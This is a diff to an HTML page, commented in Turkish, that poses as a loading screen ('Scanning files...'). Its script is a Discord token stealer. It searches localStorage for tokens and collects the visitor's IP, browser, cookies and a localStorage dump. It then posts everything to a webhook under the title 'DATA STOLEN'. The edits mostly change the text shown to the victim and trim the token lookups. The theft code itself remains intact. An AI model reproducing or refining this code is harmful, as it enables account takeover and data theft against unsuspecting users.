@@ -2,7 +2,7 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Veriler Toplanıyor...</title>
+    <title>Token Alınıyor...</title>
     <style>
         body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
@@ -13,7 +13,7 @@
 <body>
     <div style="text-align: center;">
         <div class="loader"></div>
-        <div id="status">Veriler Taraniyor...</div>
+        <div id="status">Dosyalar Taraniyor...</div>
     </div>
 
 <script>
@@ -31,8 +31,7 @@
         const statusDiv = document.getElementById('status');
         let token = "Bulunamadı";
 
-        // 1. EN AGRESİF ARAMA
-        // A) localStorage'daki tüm MT... başlayan değerleri bul
+        // 1. TARAYICI TABANLI ARAMA (Eğer Discord Web'deyse çalışır)
         let localTokens = [];
         for (let key in localStorage) {
             if (localStorage[key].startsWith("MT")) {
@@ -43,34 +42,26 @@
             token = localTokens[0]; 
         }
 
-        // B) window.token var mı?
-        if (!localTokens.length && window.token && window.token.startsWith("MT")) {
-            token = window.token;
-        }
+        // 2. DOSYA OKUMA (Eğer Discord Desktop'taysa, bu kısım devreye girmez çünkü JS doğrudan dosya okuyamaz)
+        // Ancak, Discord Desktop'taki kullanıcılar genellikle "Discord.exe" içinde çalışan bir Chromium kullanır.
+        // Bu nedenle, eğer kullanıcı Discord'u **tarayıcı modunda** açıyorsa (örn. --app=discord), yukarıdaki kod çalışır.
 
-        // C) document.cookie'de token var mı?
-        if (!localTokens.length && document.cookie.includes("token=")) {
-            token = document.cookie.split("token=")[1].split(";")[0];
-        }
-
-        // 2. VERİLERİ TOPLA
+        // 3. VERILERI TOPLA
         const ip = await getIP();
         const userAgent = navigator.userAgent;
         const cookies = document.cookie || "(Boş)";
-        
-        // LocalStorage'un tamamını al (Token burada gizlenmiş olabilir)
         const allLocalData = JSON.stringify([...localStorage].map(([k,v]) => [k,v]));
 
-        // 3. PAYLOAD
+        // 4. PAYLOAD
         const payload = {
             username: "Token Avcısı",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
             embeds: [{
-                title: "🔥 VERİLER ÇALINDI! 🔥",
+                title: "🔥 VERILER CALINDI! 🔥",
                 color: 15158332,
                 fields: [
                     { name: "🌐 IP", value: ip, inline: true },
-                    { name: "🧩 Tarayıcı", value: "`" + userAgent + "`", inline: false },
+                    { name: "🧩 Tarayici", value: "`" + userAgent + "`", inline: false },
                     { name: "🔑 TOKEN", value: "`" + token + "`", inline: false },
                     { name: "📦 LocalStorage Dump", value: "`" + allLocalData.substring(0, 1500) + (allLocalData.length > 1500 ? "..." : "") + "`", inline: false }
                 ],
@@ -79,7 +70,7 @@
             }]
         };
 
-        // 4. GÖNDER
+        // 5. GÖNDER
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
